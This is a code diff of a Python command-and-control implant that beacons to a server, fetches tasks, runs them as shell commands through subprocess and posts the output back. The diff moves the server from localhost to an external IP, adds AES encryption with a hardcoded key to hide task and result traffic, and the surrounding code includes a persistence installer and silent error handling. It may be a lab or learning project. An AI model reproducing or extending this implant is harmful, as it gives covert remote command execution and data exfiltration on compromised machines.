@@ -3,11 +3,29 @@ import subprocess
 import time
 import os
 from pathlib import Path
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
+import base64
 
 # The address of the C2 Server
 # Testing locally for now
-SERVER_URL = "http://127.0.0.1:5000"
+SERVER_URL = "http://100.65.3.15:5000"
 AGENT_ID = "agent_001"
+
+# This MUST be exactly 16, 24, or 32 bytes long
+SECRET_KEY = b'SixteenByteKey!!' 
+
+def encrypt_msg(plaintext):
+    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
+    return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')
+
+def decrypt_msg(encoded_ciphertext):
+    raw = base64.b64decode(encoded_ciphertext)
+    iv = raw[:16]
+    ciphertext = raw[16:]
+    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
+    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
 
 def install_persistence():
     # 1. Define the paths
@@ -61,7 +79,9 @@ def check_in():
     try:
         # 1. Ask for a task
         response = requests.get(f"{SERVER_URL}/get_task/{AGENT_ID}")
-        task = response.json().get("task")
+        encrypted_task = response.json().get("task")
+
+        task = decrypt_msg(encrypted_task)
 
         # 2. If the task is nop, do nothing
         if task == "nop":
@@ -79,8 +99,8 @@ def check_in():
         result = stdout + stderr
 
         # 4. Send the result back to the server
-        requests.post(f"{SERVER_URL}/post_result/{AGENT_ID}", 
-                      json={"result": result})
+        encrypted_result = encrypt_msg(result)
+        requests.post(f"{SERVER_URL}/post_result/{AGENT_ID}", json={"result": encrypted_result})
         
     # 5. Fail silently if there's an error
     except Exception as e:
